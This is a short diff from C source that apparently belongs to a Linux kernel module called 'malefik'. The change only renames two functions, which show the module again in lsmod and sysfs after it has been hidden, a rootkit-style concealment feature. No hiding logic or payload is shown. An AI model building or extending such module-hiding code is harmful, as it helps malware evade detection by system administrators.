@@ -37,7 +37,7 @@ static void sys_module_malefik_hide(void)
         is_hidden_sys = 1;
 }
 
-static void proc_lsmod_show_malefiik(void)
+static void proc_lsmod_malefiik_show(void)
 {
 	if (!is_hidden_proc)
 	{
@@ -51,7 +51,7 @@ static void proc_lsmod_show_malefiik(void)
 }
 
 
-static void sys_module_show_malefik(void)
+static void sys_module_malefik_show(void)
 {
 	if (!is_hidden_sys)
 	{
